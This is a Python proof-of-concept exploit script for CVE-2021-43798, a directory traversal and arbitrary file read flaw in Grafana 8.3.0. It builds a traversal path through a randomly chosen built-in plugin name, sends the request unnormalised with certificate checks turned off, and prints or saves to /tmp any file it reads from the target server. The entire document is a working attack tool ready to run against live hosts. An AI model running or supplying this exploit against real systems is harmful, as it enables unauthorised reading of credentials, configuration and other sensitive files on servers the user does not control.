#!/usr/bin/python3

# CVE-2021-43798 Grafana 8.3.0 - Directory Traversal and Arbitrary File Read rebuild by 0bfxgh0st*

import requests
import sys
from random import choice

plugin_list = [
    "alertlist",
    "annolist",
    "barchart",
    "bargauge",
    "candlestick",
    "cloudwatch",
    "dashlist",
    "elasticsearch",
    "gauge",
    "geomap",
    "gettingstarted",
    "grafana-azure-monitor-datasource",
    "graph",
    "heatmap",
    "histogram",
    "influxdb",
    "jaeger",
    "logs",
    "loki",
    "mssql",
    "mysql",
    "news",
    "nodeGraph",
    "opentsdb",
    "piechart",
    "pluginlist",
    "postgres",
    "prometheus",
    "stackdriver",
    "stat",
    "state-timeline",
    "status-histor",
    "table",
    "table-old",
    "tempo",
    "testdata",
    "text",
    "timeseries",
    "welcome",
    "zipkin"
]

try:

	target_host = sys.argv[1]

except:
	
	print ('CVE-2021-43798')
	print ('Grafana 8.3.0 - Directory Traversal and Arbitrary File Read')
	print ('Usage cve-2021-43798.py <url> <filename>')
	print ('Usage cve-2021-43798.py <url> <filename> -d')
	sys.exit(1)

try:

	file_to_read = sys.argv[2]

except IndexError:

	print ('Enter filename')
	sys.exit(1)

url = target_host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../' + file_to_read
s = requests.Session()
req = requests.Request(method='GET', url=url)
prep = req.prepare()
prep.url = url
r = s.send(prep, verify=False)

try:

	if sys.argv[3] == '-d':
		
		with open('/tmp/' + file_to_read.split("/")[-1].strip(),'wb') as f:

			f.write(r.content)
			f.close()
			print ('Status:', r.status_code)
			print ('File stored as /tmp/' + file_to_read.split("/")[-1].strip())

except IndexError:

	print (r.text)
